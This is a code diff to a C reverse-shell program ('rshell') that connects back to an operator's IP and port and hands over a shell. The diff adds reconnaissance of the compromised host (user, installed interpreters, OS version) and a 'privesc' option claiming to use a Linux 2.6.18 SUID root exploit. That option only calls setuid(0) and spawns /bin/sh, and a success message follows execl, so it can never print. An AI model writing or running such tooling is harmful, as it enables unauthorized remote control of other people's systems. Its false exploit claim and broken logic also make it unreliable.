@@ -5,20 +5,23 @@
 #include <unistd.h>
 #include <netinet/in.h>
 #include <arpa/inet.h>
+#include <pwd.h>
+#include <sys/utsname.h>
+
+#define _PROGRAM_NAME "rshell"
 
 int USAGE(int argc){
         if (argc < 2) {
                 printf( "Usage: ./rshell ip port\n" );
-                exit( 0 );
+                exit(0);
         }
 }
 
 int EXISTS(const char *path){
-    FILE *fptr = fopen(path, "r");
-    if (fptr == NULL)
-        return 0;
-    fclose(fptr);
-    return 1;
+        FILE *fptr = fopen(path, "r");
+        if (fptr == NULL){return 0;}
+        fclose(fptr);
+        return 1;
 }
 
 int main(int argc, char * argv[]){
@@ -41,14 +44,48 @@ int main(int argc, char * argv[]){
         dup2(sockt, 2);
 
         puts("[+] Connected");
-        puts("[i] Trying to stabilize shell with TTY");
+        puts("[i] Im going to stabilize the shell. But before im looking around for some informations about the machine.");
+        
+        //FIND USER
+        register struct passwd *pw;
+        register uid_t uid;
+        int c;
+        uid = geteuid ();
+        pw = getpwuid (uid);
+        if (pw){
+                puts("[i] User who started the program:");
+                puts (pw->pw_name);
+        }
+        fprintf (stderr,"%s: cannot find username for UID %u\n",
+        _PROGRAM_NAME, (unsigned) uid);
+
+        // FIND IF PYTHON3 AND PERL ARE INSTALLED
         if(EXISTS("/usr/bin/python3")){
                 puts("[+] Python3 is on the machine.");
         } else { puts("[-] Python3 is not on the machine.");}
         if(EXISTS("/usr/bin/perl")){
                 puts("[+] Perl is on the machine.");   
         } else{ puts("[-] Perl os not on the machine.");}
+        
+        // FIND OS INFO
+        struct utsname uts;
+        uname(&uts);
+        printf("[i] System is %s on %s hardware\n",uts.sysname, uts.machine);
+        printf("[i] OS Release is %s\n",uts.release);
+        printf("[i] OS Version is %s\n",uts.version);
+
+        // PRIVESC
+        char answer;
+        puts("[?] Before stabilizing, do you want me to try to privesc by using the Linux 2.6.18 SUID ROOT exploit?");
+        scanf("%c", &answer);
+        if(answer=='Y' || answer == 'y'){
+                setgid(0); setuid(0);
+                execl("/bin/sh","sh",0);
+                puts("[+] If it worked, you are now root and should see an #. Try to do whoami to see which user you are.");
+        }else{puts("[i] Very well. Going to continue my job then.");}
+        // STABILIZE
         puts("[+] Stabilized");
         execve(args[0], &args[0], envp);
+
         return 0;
 }
